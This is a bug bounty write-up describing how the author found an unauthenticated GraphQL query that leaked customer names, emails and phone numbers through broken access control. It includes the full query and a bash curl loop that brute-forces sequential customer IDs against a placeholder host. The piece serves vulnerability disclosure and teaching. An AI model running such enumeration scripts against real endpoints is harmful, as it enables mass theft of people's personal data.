# This is a writeup of how can I get critical $$$$ bounty from PII Disclosure - Broken Access

- **Source URL:** https://medium.com/@0xNayelx/this-is-a-writeup-of-how-can-i-get-critical-bounty-from-pii-disclosure-broken-access-7a113e5dc50c?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251025004136/https://medium.com/@0xNayelx/this-is-a-writeup-of-how-can-i-get-critical-bounty-from-pii-disclosure-broken-access-7a113e5dc50c?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8343 (id 8343)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# This is a writeup of how can I get critical $$$$ bounty from PII Disclosure - Broken Access

بسم الله ❤️, اللهم علِّمنا ما ينفعنا، وانفعنا بما علَّمتَنا، وزدنا علماً

It is my the First Bug bounty writeup, feel free to send me feedback ❤️

### Whoami

First let me introduce myself, I am 0xNayel. I am a Bug hunter for more than two years on Hackerone. I am currently top 30 in Q4 2024 and 63rd in all 2024

I found vulnerabilities in `Adobe` `inDrive` `Pepsico` and some other private programs

### Intro

In this writeup I will talk about The biggest bounty I’ve ever taken it is 4-digts bounty on private program on hackerone, the Bug was critical and tricky but straight forward to exploit however it Takes more than 2 months to response, Also a very strange scenario happened to me, I will explain it

### Let’s Begin

The program scope was small they include the main app that the program relies on directly in their online business, it has multiple functionalities which is great for me as we know the manual test is different from the automated one. It develops your creativity and reduces routine. It also requires more effort, but it is worth it.

First I start explore the the app: create accounts, play with functions, build strong background about the technologies used

Finding the bug was faster than I imagined, it was in the first few hours of exploring the js files.

### Steps That allowed me to find the bug:

- I opened the burp and start sending requests from app and see them in history of burp in order to identify the technology and flow that the program use
- I found a weird thing that the program use diffrent methods to interact with the backend, I found Normal api requests (for main functions ) and also graphQL requests (for analytics purpose)
- I immediately send Introspection query to see all possible queries and start to explore them but they was too many, so I opened js files and start search for any thing related to GraphQL
- I found query called `companyUserinfo` that take my attention so I returned to introspection query and I found important comment in the Query `# Doesn't require a Token` , Lets test .

- I notice that the query needs 3 variables, important ones was `storehash` it is a constant value that the user assigned in when creating account, `customerId` it is 6-digit ID of the user I want to exfiltrate its data, `email` wasn’t important as I can leave it empty

`"storeHash":"XXXXXX","email":"nayel@nayel.nayel","customerId":000000`
- start - *testing for my account* (worked)
-*test IDOR from another account* (worked) means it is vulnerable
returning to the comment I fount`# Doesn't require a Token`
-*test for non auth request* (also worked) means this is no Access control on this query,
This is the query:

```
query ($storeHash: String!, $email: String!, $customerId: Int) {
    companyUserInfo(storeHash: $storeHash, email: $email, customerId: $customerId) {
        userInfo {
            companyRoleId
            companyRoleName
            email
            firstName
            forcePasswordReset
            id
            lastName
            phoneNumber
            role
        }
        userType
    }
}
Variables:
{
    "storeHash": "XXXXXX",
    "email": "nayel@nayel.nayel",
    "customerId": 000000
}
```
Respone was PII user data:

```
{
  "data": {
    "companyUserInfo": {
      "userInfo": {
        "companyRoleId": 1234,
        "companyRoleName": "Senior Buyer",
        "email": "nayel@nayel.com",
        "firstName": "0xNayel",
        "forcePasswordReset": false,
        "id": 1234567,
        "lastName": "elQorsan",
        "phoneNumber": "0123456789",
        "role": 1
      },
      "userType": 3
    }
  }
}
```
- So I make a POC it is a cURL command to brute force 30 users ( there is no rate limit I can fetch all users data here)

```
for i in {1..30}; do
ii=$(printf "%02d" $i)
curl -skg -X POST https://nayel.nayel.com/graphql \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" \
     -H "Accept: */*" \
     -H "Content-Type: application/json" \
     -H "Accept-Encoding: gzip, deflate, br" \
     --data-raw '{"query":"query ($storeHash: String!, $email: String!,$customerId: Int) {\r\n    companyUserInfo(storeHash: $storeHash, email:$email, customerId: $customerId) {\r\n        userInfo {\r\n            companyRoleId\r\n            companyRoleName\r\n            email\r\nfirstName\r\n            forcePasswordReset\r\n            id\r\n            lastName\r\n            phoneNumber\r\n            role\r\n}\r\n        userType\r\n    }\r\n}\r\n","variables":{"storeHash":"XXXXX","email":"nayel@nayel.nayel","customerId":3260$ii}}'
done
```
### After reporting:

I faced a wired scenario, I got an email after 5 days from reporting from the company on the account that I used to register on the app, The content was that the company user data was exfiltrated and they fix the vulnerability.

I really don’t know if I’m the reason or if they were hacked by chance at the same time, so I tried to reproduce the bug but as they said they already make a fix 

I felt that I was late and the report would not be accepted because hackerone did not even triage the report.

Last weird part as I did not expect, they responded to me by paying the bounty.
